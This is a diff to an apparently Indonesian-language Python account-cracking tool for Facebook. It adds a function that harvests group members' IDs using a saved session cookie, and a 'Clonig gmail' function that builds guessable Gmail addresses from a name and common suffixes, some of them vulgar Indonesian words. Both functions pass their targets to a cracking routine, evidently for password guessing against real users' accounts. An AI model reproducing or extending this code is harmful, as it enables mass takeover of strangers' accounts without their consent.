@@ -140,8 +140,9 @@ def menu():
 	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
 	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
 	print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mCrack dari  anggota group')
-	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mLihat hasil crack')
-	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mSetting user agent')
+	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mClonig gmail')
+	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mLihat hasil crack')
+	print (' \x1b[1;96m[\x1b[1;97m8\x1b[1;96m] \x1b[1;97mSetting user agent')
 	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
 	print('')
 	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
@@ -282,8 +283,81 @@ def follow(token,cookie):
 	print('')
 	return crack().__xnx__(id)
 
-# CRACK ANGGOTA GROUP
-
+# CRACK GROUP
+def groups(self,data_):
+	try:
+		respon = self.roomz.get(data_, cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
+		otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',respon)
+		for i in otw:
+			if "profile.php?" in i[0]:
+				self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
+			else:
+				self.id.append(i[0]+"<=>"+i[1])
+			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
+		if "Lihat Selengkapnya" in respon:
+			self.groups(self.url_mb+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
+		else:
+			def tambah(self,gc):
+				a = self.roomz.get(gc, cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
+				b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
+				if len(b)!=0:
+					for c in b:
+						if "profile.php" in c[0]:
+							d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
+							if d in self.id:
+								continue
+							else:
+								self.id.append(d+"<=>"+c[1])
+						else:
+							d=re.search("(.*?)\?refid",c[0]).group(1)
+							if d in self.id:
+								continue
+							else:
+								self.id.append(d+"<=>"+c[1])
+							sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
+				if "Lihat Postingan Lainnya" in a:
+					self.tambah(self.url_mb+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
+			self.tambah(f"{self.url_mb}/groups/"+re.search("id=(\\d*)",data_).group(1))
+	except:
+		pass
+	print("")
+	if len(self.id)!=0:
+		return crc().romiy(self.id)
+	else:
+		exit('%s╰─%s gagal mengambil id'%(p,m))
+		
+# CLONIG GMAIL
+def cloning_gmail(self,nama,jumlah):
+	try:
+		rc = random.choice
+		rr = random.randint
+		domain = "@gmail.com"
+		angka = ["01","0123","123","1234","12345","321","232","225","3488","993","552","332",
+			"786","987","098","716","25","456","983","113","331","441","333","666","777","898",
+			"987","7676","678","343","543","234","567","789",
+		]
+		huruf = ["gaming","official","utama","ganteng","gntg","gans","cakep","cantik","cans","xyz",
+			"freefire","ff","ml","mlbb","gimang","kontol","memek","gg","gtg","store","tzy","pubg","xx",
+			"xxx","com"
+			]
+		if "@" not in str(domain) or ".com" not in str(domain):
+			exit('%s╰─%s ups error :('%(p,m))
+		for xyz in range(int(jumlah)):
+			A = nama 
+			B = [f'{str(rc(angka))}',f'{str(rr(0,31))}',f'{str(rc(huruf))}'f'{str(rc(angka))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(huruf))}{str(rr(0,31))}',f'{str(rc(angka))}{str(rc(huruf))}']
+			C = domain 
+			D = f'{A}{str(rc(B))}{C}'
+			if D in self.id:pass 
+			else:self.id.append(D+'<=>'+nama)
+			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)}     '),sys.stdout.flush();jeda(0.0050)
+	except:
+		pass 
+	print ('')
+	if len(self.id)!=0:
+		return crc().romiy(self.id)
+	else:
+		exit('%s╰─%s gagal mengambil id'%(p,m))
+		
 # LIHAT HASIL
 oke,cepe=[],[]
 def hasil():
